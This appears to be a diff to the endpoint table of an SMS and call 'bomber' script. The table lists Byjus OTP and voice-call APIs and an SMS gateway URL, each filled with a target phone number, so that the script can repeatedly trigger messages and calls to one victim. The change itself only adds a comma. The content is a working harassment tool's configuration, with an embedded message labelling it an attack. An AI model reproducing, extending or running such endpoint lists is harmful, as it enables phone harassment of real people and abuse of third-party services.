@@ -2,7 +2,7 @@ apidata = {
 
 "Byjus":("https://mtnucleus.byjusweb.com/api/acs/v2/send-otp",{"phoneNumber":target,"page":"free-trial-classes"},{},"POST","""{"isOtpExhausted":false,"""),
 
-"ByCall":(f"https://mtnucleus.byjusweb.com/api/acs/voice?phoneNumber={target}&page=free-trial-classes",{},"GET",'''success":true''')
+"ByCall":(f"https://mtnucleus.byjusweb.com/api/acs/voice?phoneNumber={target}&page=free-trial-classes",{},"GET",'''success":true'''),
 
 "Kisan":(f"https://www.customsms.tk/sms.php?num={number}&msg=SendByBaapGAttack",{},"GET",'''000''')
 
